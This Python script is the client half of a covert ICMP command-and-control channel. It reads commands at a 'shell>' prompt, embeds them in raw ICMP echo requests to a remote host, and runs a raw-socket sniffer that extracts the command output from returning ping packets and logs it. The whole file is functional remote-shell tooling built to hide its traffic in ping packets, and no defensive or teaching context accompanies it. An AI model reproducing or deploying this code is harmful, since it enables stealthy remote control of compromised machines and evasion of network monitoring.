import socket
import argparse
import re
import _thread
import os
import struct
import time

ICMP_ECHO_REQUEST_TYPE = 8
ICMP_ECHO_REQUEST_CODE = 0


def checksum(packet):
    def carry_around_add(a, b):
        c = a + b
        return (c & 0xffff) + (c >> 16)
    s = 0
    packet = bytearray(packet)
    for i in range(0, len(packet), 2):
        try:
            w = packet[i] + (packet[i + 1] << 8)
        except IndexError:
            w = packet[i] + (0 << 8)
        s = carry_around_add(s, w)
    chsum = ~s & 0xffff
    chsum = ((chsum & 0x00ff) << 8) + ((chsum & 0xff00) >> 8)
    return chsum


def send_one_ping(my_socket, dest_addr, my_id, payload):
    data = str.encode("@@" + payload)
    dest_addr = socket.gethostbyname(dest_addr)
    # Header: type (8), code (8), checksum (16), id (16), sequence (16)
    fmt = "bbHHH"
    # Make a dummy header with a 0 checksum
    my_checksum = 0
    header = struct.pack(fmt, ICMP_ECHO_REQUEST_TYPE, ICMP_ECHO_REQUEST_CODE, my_checksum, my_id, 1)
    # Calculate the checksum on the data and the dummy header.
    my_checksum = checksum(header + data)
    header = struct.pack(fmt, ICMP_ECHO_REQUEST_TYPE, ICMP_ECHO_REQUEST_CODE, socket.htons(my_checksum), my_id, 1)
    packet = header + data
    my_socket.sendto(packet, (dest_addr, 1))  # Don't know about the 1


def send_one(dest_addr, delay, payload):
    icmp = socket.getprotobyname("icmp")
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    my_id = os.getpid() & 0xFFFF
    send_one_ping(my_socket, dest_addr, my_id, payload)
    my_socket.close()
    time.sleep(delay)


# The sniffer part starts here..!!!
def writer(data, file):
    f = open(file, 'a')
    f.write(data)


def clear_file(file):
    f = open(file, 'w')
    f.write("")


def reader(file):
    f = open(file, 'r')
    con = f.readline()
    content = con.replace("@@", "")
    clear_file(file)
    return content


def start_sniffing(host, log_file):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.bind((host, 0))
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    print("Sniffer Started.....")
    while True:
        try:
            data = s.recvfrom(65565)
            d1 = data[0]
            if bytearray(d1)[20] != ICMP_ECHO_REQUEST_TYPE:
                continue
            d1 = str(d1)
            data1 = re.search('@@(.*)\'', d1)
            data_part = data1.group(0)
            data_part = data_part[:len(data_part)-1]
            writer(data_part, log_file)
            print("Command output:", reader(log_file))
        except:
            pass


def parse_args():
    parser = argparse.ArgumentParser(description="A simple client that communicates \n"
                                                 "with server via covert ICMP channel\n"
                                                 "sends commands and gets output back")
    parser.add_argument("host_out", help="The interface to send requests")
    parser.add_argument("host_in", help="The interface to listen replies")
    parser.add_argument("ping_delay", help="Delay between answer pings", nargs='?', type=int, default=1)
    parser.add_argument("log_file", help="File to log server answers",
                        nargs='?', type=str, default='/var/log/icmp_covert.log')
    args = parser.parse_args()
    return args


def main():
    args = parse_args()
    host_out = args.host_out
    host_in = args.host_in
    ping_delay = args.ping_delay
    log_file = args.log_file
    _thread.start_new_thread(start_sniffing, (host_in, log_file))
    time.sleep(5)
    while True:
        command = input("shell>")
        if command == "quit":
            break
        else:
            send_one(host_out, ping_delay, command)
            print("Executing Command....\n")


if __name__ == "__main__":
    main()
